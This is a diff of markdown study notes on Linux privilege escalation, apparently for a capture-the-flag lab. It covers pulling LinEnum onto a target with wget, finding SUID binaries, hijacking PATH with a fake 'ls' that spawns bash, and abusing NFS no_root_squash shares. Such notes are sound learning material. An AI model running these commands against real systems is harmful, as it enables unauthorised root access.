@@ -142,7 +142,7 @@ scp LinEnum/linpeas.sh jan@10.10.37.200:/dev/shm
 
 There are two ways to get LinEnum on the target machine. 
 
-1. Go to the directory that you have your local copy of LinEnum stored in, and start a Python web server using **"python3 -m http.server 8000"** . Then using **"wget"** on the target machine, and your local IP, you can grab the file from your local machine. Then make the file executable using the command **"chmod +x FILENAME.sh"**.
+1. Go to the directory that you have your local copy of LinEnum stored in, and start a Python web server using **"python3 -m http.server 8000"** . Then using **"wget"** on the target machine, and your local IP, you can grab thfile from your local machine. Then make the file executable using the command **"chmod +x FILENAME.sh"**.
 2. if you have sufficient permissions, copy the raw LinEnum code from your local machine and paste it into a new file on the target, using Vi or Nano. Once you've done this, you can save the file with the **".sh"** extension. Then make the file executable using the command **"chmod +x FILENAME.sh"**.
 
 Start a server from the directory that contains LinEnum.sh
@@ -183,15 +183,16 @@ switch to new user
 ## Exploiting SUID Files
 
 ### Find all SUID/GUID executables
-`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
-
+```
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+```
 
 SUID files: Look like
 `-rwsr-xr-x
 Notice the ***'S'***
 
 ctrl+F to find this part of your LinEnum scan
-```
+
 [-] SUID files:
 -rwsr-xr-x 1 root root 30800 Aug 11 2016 /bin/fusermount
 -rwsr-xr-x 1 root root 8392 Jun 4 2019 /home/user5/script
@@ -411,10 +412,23 @@ When the tar command in the cron job runs, the wildcard will expand to include t
 
 ## Exploiting PATH Variable
 
+
+Typically the PATH will look like this: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+If we type “thm” to the command line, these are the locations Linux will look in for an executable called thm.
+
 view the Path of the relevant user `echo $PATH`
 
-1. find a program that runs an SUID binary such as `ls` or `curl`
-2. create an imitation executable
+1. What folders are located under $PATH
+2. Does your current user have write privileges for any of these folders?
+3. Can you modify $PATH?
+4. Is there a script/application you can start that will be affected by this vulnerability?
+
+### Exploit Steps 
+
+1. find a program that runs an SUID binary such as `ls` or `curl` using
+2. use `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | sort -u` to find writable folders
+1. create an imitation executable in a writable folder
 `cd /tmp`
 `echo "/bin/bash" > ls`
 `chmod +x ls`
@@ -423,6 +437,10 @@ view the Path of the relevant user `echo $PATH`
 4. run the script and you should have root
 
 you can use `strings [SUID program]` to quickly determine if  any commands are being run with out a full path e.g `curl -I localhost` instead of `/usr/bin/curl -I localhost`
+
+OR
+
+
 
 ## Exploit Services 
 
@@ -517,10 +535,17 @@ https://atom.hackstreetboys.ph/linux-privilege-escalation-shell-escape-sequences
 
 1. shows visible NFS shares on that IP 
     ```
-     showmount -e [IP]
+    (FROM THE ATTACKING MACHINE)
+    showmount -e [IP]
+	
+	(OR  from the target machine)
+	cat /etc/exports
+	```
+If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
+
+1. mounts the share from "IP:share" to the directory "/tmp/mount"
     ```
-2. mounts the share from "IP:share" to the directory "/tmp/mount"
-    ```
+    (from the attacking machine)
     sudo mount -t nfs IP:share /tmp/mount/ -nolock
     ```
 3. Download Bash executable  
